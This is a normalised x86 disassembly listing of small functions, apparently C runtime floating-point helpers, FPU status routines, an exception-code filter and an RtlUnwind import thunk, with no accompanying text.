fld [ esp + 0x20 ]
fxch st6
add esp 0x2c
retn
sub_41c82e
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st5
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st5
fld [ esp + 0xc ]
fxch st6
add esp 0x2c
retn
sub_41c872
fstp [ esp ]
fxch st5
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st5
add esp 0x2c
retn
sub_41c886
fstp [ esp + 0xc ]
fxch st5
fstp [ esp ]
call sub_41c3a0
fxch st5
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c89e
fstp [ esp + 0xc ]
fxch st5
fstp [ esp ]
call sub_41c3a0
fxch st5
add esp 0x2c
retn
sub_41c8b2
fstp [ esp + 0xc ]
fxch st6
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st6
fld [ esp + 0x20 ]
fxch st7
add esp 0x2c
retn
sub_41c8d2
add esp 0x2c
int 0x6
fstp [ esp ]
fxch st6
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st6
fld [ esp + 0xc ]
fxch st7
add esp 0x2c
retn
sub_41c916
fstp [ esp ]
fxch st6
fstp [ esp + 0xc ]
call sub_41c3a0
fxch st6
add esp 0x2c
retn
sub_41c92a
fstp [ esp + 0xc ]
fxch st6
fstp [ esp ]
call sub_41c3a0
fxch st6
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_41c942
fstp [ esp + 0xc ]
fxch st6
fstp [ esp ]
call sub_41c3a0
fxch st6
add esp 0x2c
retn
sub_41cb7c
push eax
sub esp 0x2c
fstp [ esp ]
fstp [ esp + 0xc ]
call sub_41c3a0
add esp 0x2c
pop eax
retn
sub_41cb91
push eax
sub esp 0x2c
fstp [ esp + 0xc ]
fstp [ esp ]
call sub_41c3a0
add esp 0x2c
pop eax
retn
sub_41d119
call sub_41cdac
retn
sub_41d11f
call sub_41d064
retn
sub_41d125
fpatan
retn
sub_41d128
fptan
retn
sub_41d227
xor eax eax
retn
sub_41d906
push ecx
push ecx
fld [ esp + 0xc ]
frndint
fstp [ esp ]
fld [ esp ]
pop ecx
pop ecx
retn
sub_41da4b
push ecx
fwait
fnstsw [ esp ]
movsx eax [ esp ]
pop ecx
retn
sub_41da56
push ecx
fnstsw [ esp ]
fnclex
movsx eax [ esp ]
pop ecx
retn
sub_41db0c
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41dfa2
call sub_4118e7
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4189dd
sub_41e2f2
push 0x4
push 0x0
push [ esp + 0xc ]
push 0x0
call sub_41e2a1
add esp 0x10
retn
sub_41e305
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_41b8aa
add esp 0xc
retn
sub_420448
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_42035c
add esp 0x10
retn
sub_420fdd
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_420f23
add esp 0xc
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
